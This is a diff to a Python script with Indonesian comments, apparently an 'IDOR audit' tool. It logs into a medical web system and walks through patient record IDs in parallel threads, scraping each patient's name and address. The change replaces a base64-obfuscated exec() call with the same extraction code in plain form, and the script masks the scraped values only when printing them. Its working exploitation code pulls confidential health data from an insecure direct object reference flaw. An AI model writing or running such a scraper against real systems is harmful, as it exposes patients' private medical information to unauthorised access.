@@ -100,7 +100,31 @@ def fetch_data(id_num):
         if res.status_code != 200: return
 
         # Protected extraction and masking logic
-        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCm5fdGFnID0gc291cC5maW5kKCdwJywgY2xhc3NfPSdzYWxlLXByaWNlIHRleHQtc3VjY2VzcycpIG9yIHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZScpCmlmIG5fdGFnOgogICAgbmFtYSA9IG5fdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpLnJlcGxhY2UoIk5hbWEgUGFzaWVuIDoiLCAiIikuc3RyaXAoKQogICAgYWRkciA9ICJUaWRhayBEaXRlbXVrYW4iCiAgICBkZXRhaWxzID0gc291cC5maW5kX2FsbCgncCcsIGNsYXNzXz0nZGV0YWlsJykKICAgIGZvciBwIGluIGRldGFpbHM6CiAgICAgICAgaWYgIkFsYW1hdCIgaW4gcC5nZXRfdGV4dCgpOiBhZGRyID0gcC5nZXRfdGV4dCgpLnNwbGl0KCI6IilbLTFdLnN0cmlwKCk7IGJyZWFrCiAgICBtX25hbWEgPSBmIntuYW1hWzoyXS51cHBlcigpfSooe25hbWFbLTE6XS51cHBlcigpfSIgaWYgbGVuKG5hbWEpID4gMyBlbHNlIG5hbWEudXBwZXIoKQogICAgbV9hZGRyID0gZiJ7YWRkcls6Ml0udXBwZXIoKX0qKnthZGRyWy0xOl0udXBwZXIoKX0iIGlmIGxlbihhZGRyKSA+IDMgZWxzZSBhZGRyLnVwcGVyKCkKICAgIGkgPSBmb3JtYXR0ZWRfaWQKICAgIG0gPSBsZW4oaSkvLzIKICAgIG1fcm0gPSBmIntpWzoyXX17JyonKihtLTIpfXtpW21dfXsnKicqKGxlbihpKS1tLTIpfXtpWy0xOl19IgogICAgcHJpbnQoZIlcbltcMDMzWzkybStcMDMzWzBtXSBSTTp7bV9ybX0gfCBOYW1hOnttX25hbWF9IHwgQWxhbWF0OnttX2FkZHJ9Iik="))
+        if res.status_code == 200:
+            soup = BeautifulSoup(res.text, 'html.parser')
+            # Cari tag nama (sale-price)
+            n_tag = soup.find('p', class_='sale-price text-success') or soup.find('p', class_='sale-price')
+            if n_tag:
+                nama = n_tag.get_text(strip=True).replace("Nama Pasien :", "").strip()
+                if nama:
+                    alamat = "Tidak Ditemukan"
+                    details = soup.find_all('p', class_='detail')
+                    for p in details:
+                        txt = p.get_text(strip=True)
+                        if "Alamat" in txt:
+                            alamat = txt.split(":")[-1].strip()
+                            break
+                    
+                    # Masking RM: 2 depan, 1 tengah, 1 belakang
+                    mid_idx = len(formatted_id) // 2
+                    m_rm = f"{formatted_id[:2]}{'*' * (mid_idx - 2)}{formatted_id[mid_idx]}{'*' * (len(formatted_id) - mid_idx - 2)}{formatted_id[-1]}"
+                    # Masking Nama/Alamat: 2 depan, 1 belakang
+                    m_name = f"{nama[:2].upper()}**{nama[-1:].upper()}" if len(nama) > 3 else nama.upper()
+                    m_addr = f"{alamat[:2].upper()}**{alamat[-1:].upper()}" if len(alamat) > 3 else alamat.upper()
+                    
+                    with lock:
+                        # Print hasil dengan warna hijau agar mencolok
+                        print(f"\n[\033[92m+\033[0m] RM:{m_rm} | Nama:{m_name} | Alamat:{m_addr}")
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
@@ -325,6 +349,8 @@ def start_process(id_list):
         with ThreadPoolExecutor(max_workers=int(_decode("Mg=="))) as executor:
             executor.map(fetch_data, id_list)
         print("\n[*] IDOR Audit Completed. Data displayed in terminal.")
+    else:
+        print("[\033[91m!\033[0m] Gagal Login: Periksa kredensial atau Captcha.")
 
 def main_menu():
     while True:
